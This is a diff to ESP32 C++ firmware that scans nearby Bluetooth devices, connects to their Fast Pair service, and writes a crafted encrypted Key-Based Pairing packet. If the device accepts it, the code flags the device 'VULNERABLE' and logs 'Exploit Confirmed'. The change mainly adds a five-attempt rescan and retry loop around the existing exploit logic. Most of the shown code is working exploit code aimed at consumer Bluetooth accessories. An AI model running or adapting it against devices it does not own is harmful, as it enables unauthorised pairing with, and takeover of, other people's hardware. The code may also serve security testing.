@@ -251,192 +251,202 @@ public:
         
         // 1. HARD STOP SCAN (Keep existing logic here...)
         bool wasScanning = isScanning();
-        if(wasScanning) {
-            stopScan(); 
-            // ... (keep existing wait logic) ...
-        }
+        if(wasScanning) stopScan();
 
-        ScannedDevice dev;
-        bool found = false;
-
-        // --- NEW SAFE LOOKUP LOGIC ---
-        lockList();
-        
-        // A. Try the index first (Fastest)
-        if(index >= 0 && index < discoveredDevices.size()) {
-            if (discoveredDevices[index].name == expectedName) {
-                dev = discoveredDevices[index]; // Copy fresh data (including new MAC)
-                found = true;
+        bool success = false;
+        // Start Retry Loop
+        for(int attempt = 0; attempt < 5; attempt++) { 
+            if(attempt > 0) {
+                startScan(); 
+                delay(5000); 
+                stopScan();
+                delay(1000); 
             }
-        }
+            ScannedDevice dev;
+            bool found = false;
 
-        // B. If index failed (list shifted), search by Name
-        if (!found) {
-            Serial.println("DEBUG: Index mismatch, searching by name...");
-            for (const auto& d : discoveredDevices) {
-                if (d.name == expectedName) {
-                    dev = d;
+            // --- NEW SAFE LOOKUP LOGIC ---
+            lockList();
+            
+            // A. Try the index first (Fastest)
+            if(index >= 0 && index < discoveredDevices.size()) {
+                if (discoveredDevices[index].name == expectedName) {
+                    dev = discoveredDevices[index]; // Copy fresh data (including new MAC)
                     found = true;
-                    break;
                 }
             }
-        }
-        unlockList();
-        // -----------------------------
 
-        if (!found) {
-            Serial.println("Error: Device not found (List changed?)");
-            if(wasScanning) startScan();
-            return false;
-        }
+            // B. If index failed (list shifted), search by Name
+            if (!found) {
+                Serial.println("DEBUG: Index mismatch, searching by name...");
+                for (const auto& d : discoveredDevices) {
+                    if (d.name == expectedName) {
+                        dev = d;
+                        found = true;
+                        break;
+                    }
+                }
+            }
+            unlockList();
+            // -----------------------------
 
-        Serial.printf("DEBUG: Targeting Fresh MAC: %s\n", dev.rawAddr.toString().c_str());
-
-        // Cleanup previous client
-        if(pClient != nullptr) {
-            NimBLEDevice::deleteClient(pClient);
-            pClient = nullptr;
-        }
-
-        // USE RAW ADDRESS DIRECTLY (Preserves Type and exact MAC bytes)
-        NimBLEAddress targetAddr = dev.rawAddr;
-
-        pClient = NimBLEDevice::createClient();
-        if(!pClient) {
-            Serial.println("DEBUG: Failed to create client (Heap?)");
-            if(wasScanning) startScan();
-            return false;
-        }
-        pClient->setClientCallbacks(new MyClientCallbacks(), true);
-        pClient->setConnectTimeout(8); // 8 seconds
-
-        Serial.println("Connecting...");
-        bool connected = false;
-        int retryDelay = 1000;
-        
-        for(int i=0; i<3; i++) {
-            Serial.printf("DEBUG: Initiating connection to %s...\n", targetAddr.toString().c_str());
-            unsigned long startConn = millis();
-
-            // Attempt connect (false = do NOT delete attributes, faster retry)
-            bool attempt = pClient->connect(targetAddr, false);
-            
-            // Race condition check: Sometimes connect() returns false but IS connected
-            if (!attempt && pClient->isConnected()) {
-                Serial.println("DEBUG: connect() returned false but isConnected() is true!");
-                attempt = true;
+            if (!found) {
+                Serial.println("Error: Device not found (List changed?)");
+                continue;
             }
 
-            if(attempt) { 
-                Serial.printf("DEBUG: Connection Success (Time: %lu ms)\n", millis() - startConn);
-                connected = true;
-                break;
-            } else {
-                Serial.printf("DEBUG: Connect Attempt %d Failed (Time: %lu ms). RSSI: %d\n", 
-                    i+1, millis() - startConn, pClient->getRssi());
-                
-                // Soft reset of client state
-                pClient->disconnect(); 
-                delay(retryDelay);
-                retryDelay += 500; 
-            }
-        }
+            Serial.printf("DEBUG: Targeting Fresh MAC: %s\n", dev.rawAddr.toString().c_str());
 
-        if(!connected) {
-            Serial.println("Connection Failed.");
-            if(pClient) {
+            // Cleanup previous client
+            if(pClient != nullptr) {
                 NimBLEDevice::deleteClient(pClient);
                 pClient = nullptr;
             }
-            if(wasScanning) startScan();
-            return false;
-        }
 
-        Serial.println("Connected! (Validating...)");
-        
-        // 5. MTU
-        if(pClient->exchangeMTU()) {
-             Serial.println("DEBUG: MTU Exchange Requested");
-        }
-        delay(300); 
+            // USE RAW ADDRESS DIRECTLY (Preserves Type and exact MAC bytes)
+            NimBLEAddress targetAddr = dev.rawAddr;
 
-        bool success = false;
-        notificationReceived = false;
+            pClient = NimBLEDevice::createClient();
+            if(!pClient) {
+                Serial.println("DEBUG: Failed to create client (Heap?)");
+                if(wasScanning) startScan();
+                return false;
+            }
+            pClient->setClientCallbacks(new MyClientCallbacks(), true);
+            pClient->setConnectTimeout(8); // 8 seconds
 
-        NimBLERemoteService* pSvc = pClient->getService(uuidFastPair);
-        if(pSvc) {
-            NimBLERemoteCharacteristic* pChar = pSvc->getCharacteristic(kbpUUID);
-            if(pChar) {
-                Serial.println("Applying Quirk Delay (250ms)...");
-                delay(250); 
+            Serial.println("Connecting...");
+            bool connected = false;
+            int retryDelay = 1000;
+            
+            for(int i=0; i<3; i++) {
+                Serial.printf("DEBUG: Initiating connection to %s...\n", targetAddr.toString().c_str());
+                unsigned long startConn = millis();
 
-                if(pChar->canNotify()) {
-                    pChar->subscribe(true, [this](NimBLERemoteCharacteristic* pChar, uint8_t* pData, size_t length, bool isNotify){
-                        this->notificationReceived = true;
-                        Serial.printf("DEBUG: Notification RX Len: %d\n", length);
-                    });
+                // Attempt connect (false = do NOT delete attributes, faster retry)
+                bool attempt = pClient->connect(targetAddr, false);
+                
+                // Race condition check: Sometimes connect() returns false but IS connected
+                if (!attempt && pClient->isConnected()) {
+                    Serial.println("DEBUG: connect() returned false but isConnected() is true!");
+                    attempt = true;
                 }
 
-                // 6. ENCRYPTION & WRITE
-                uint8_t raw[16];
-                raw[0] = 0x00; 
-                raw[1] = 0x11; 
-                
-                String addrStr = dev.address;
-                int byteIdx = 0;
-                for (int i = 0; i < addrStr.length() && byteIdx < 6; i++) {
-                    char c = addrStr[i];
-                    if (c == ':') continue;
-                    uint8_t val = parseHexNibble(c) << 4;
-                    if (i + 1 < addrStr.length()) val |= parseHexNibble(addrStr[++i]);
-                    raw[2 + byteIdx] = val;
-                    byteIdx++;
-                }
-                
-                uint8_t salt[8];
-                for(int i=0; i<8; i++) {
-                    salt[i] = (uint8_t)random(0xFF);
-                    raw[8+i] = salt[i];
-                }
-
-                uint8_t key[16] = {0}; 
-                memcpy(key, salt, 8); 
-
-                uint8_t encrypted[16];
-                encryptPacketWithKey(raw, encrypted, key);
-                
-                if(pChar->writeValue(encrypted, 16, true)) {
-                    Serial.println("Write Accepted -> VULNERABLE");
-                    success = true; 
+                if(attempt) { 
+                    Serial.printf("DEBUG: Connection Success (Time: %lu ms)\n", millis() - startConn);
+                    connected = true;
+                    break;
                 } else {
-                    Serial.println("Write Failed");
+                    Serial.printf("DEBUG: Connect Attempt %d Failed (Time: %lu ms). RSSI: %d\n", 
+                        i+1, millis() - startConn, pClient->getRssi());
+                    
+                    // Soft reset of client state
+                    pClient->disconnect(); 
+                    delay(retryDelay);
+                    retryDelay += 500; 
                 }
+            }
 
-                if (success) {
-                    unsigned long startWait = millis();
-                    while(millis() - startWait < 2000) { 
-                        if(notificationReceived) {
-                            Serial.println("Exploit Confirmed (Notification Received)!");
-                            break;
-                        }
-                        delay(10); 
-                    }
+            if(!connected) {
+                Serial.println("Connection Failed.");
+                if(pClient) {
+                    NimBLEDevice::deleteClient(pClient);
+                    pClient = nullptr;
                 }
+                if(wasScanning) startScan();
+                return false;
+            }
 
-                if (success) {
-                    lockList();
-                    for(auto& d : discoveredDevices) {
-                        if(d.rawAddr == dev.rawAddr) {
-                            d.isVulnerable = true;
-                            vulnerableCount++;
-                            break;
+            Serial.println("Connected! (Validating...)");
+            
+            // 5. MTU
+            if(pClient->exchangeMTU()) {
+                Serial.println("DEBUG: MTU Exchange Requested");
+            }
+            delay(300); 
+
+            bool success = false;
+            notificationReceived = false;
+
+            NimBLERemoteService* pSvc = pClient->getService(uuidFastPair);
+            if(pSvc) {
+                NimBLERemoteCharacteristic* pChar = pSvc->getCharacteristic(kbpUUID);
+                if(pChar) {
+                    Serial.println("Applying Quirk Delay (250ms)...");
+                    delay(250); 
+
+                    if(pChar->canNotify()) {
+                        pChar->subscribe(true, [this](NimBLERemoteCharacteristic* pChar, uint8_t* pData, size_t length, bool isNotify){
+                            this->notificationReceived = true;
+                            Serial.printf("DEBUG: Notification RX Len: %d\n", length);
+                        });
+                    }
+
+                    // 6. ENCRYPTION & WRITE
+                    uint8_t raw[16];
+                    raw[0] = 0x00; 
+                    raw[1] = 0x11; 
+                    
+                    String addrStr = dev.address;
+                    int byteIdx = 0;
+                    for (int i = 0; i < addrStr.length() && byteIdx < 6; i++) {
+                        char c = addrStr[i];
+                        if (c == ':') continue;
+                        uint8_t val = parseHexNibble(c) << 4;
+                        if (i + 1 < addrStr.length()) val |= parseHexNibble(addrStr[++i]);
+                        raw[2 + byteIdx] = val;
+                        byteIdx++;
+                    }
+                    
+                    uint8_t salt[8];
+                    for(int i=0; i<8; i++) {
+                        salt[i] = (uint8_t)random(0xFF);
+                        raw[8+i] = salt[i];
+                    }
+
+                    uint8_t key[16] = {0}; 
+                    memcpy(key, salt, 8); 
+
+                    uint8_t encrypted[16];
+                    encryptPacketWithKey(raw, encrypted, key);
+                    
+                    if(pChar->writeValue(encrypted, 16, true)) {
+                        Serial.println("Write Accepted -> VULNERABLE");
+                        success = true; 
+                    } else {
+                        Serial.println("Write Failed");
+                    }
+
+                    if (success) {
+                        unsigned long startWait = millis();
+                        while(millis() - startWait < 2000) { 
+                            if(notificationReceived) {
+                                Serial.println("Exploit Confirmed (Notification Received)!");
+                                break;
+                            }
+                            delay(10); 
                         }
                     }
-                    unlockList();
-                }
-            } else Serial.println("No KBP Char");
-        } else Serial.println("No FP Service");
-        
+
+                    if (success) {
+                        lockList();
+                        for(auto& d : discoveredDevices) {
+                            if(d.rawAddr == dev.rawAddr) {
+                                d.isVulnerable = true;
+                                vulnerableCount++;
+                                break;
+                            }
+                        }
+                        unlockList();
+                    }
+                } else Serial.println("No KBP Char");
+            } else Serial.println("No FP Service");
+            
+            if (success) return true;
+            if (pClient && pClient->isConnected()) break; 
+            if (pClient) pClient->disconnect();
+        } 
+
         Serial.println("Disconnecting...");
         if(pClient) {
             pClient->disconnect();
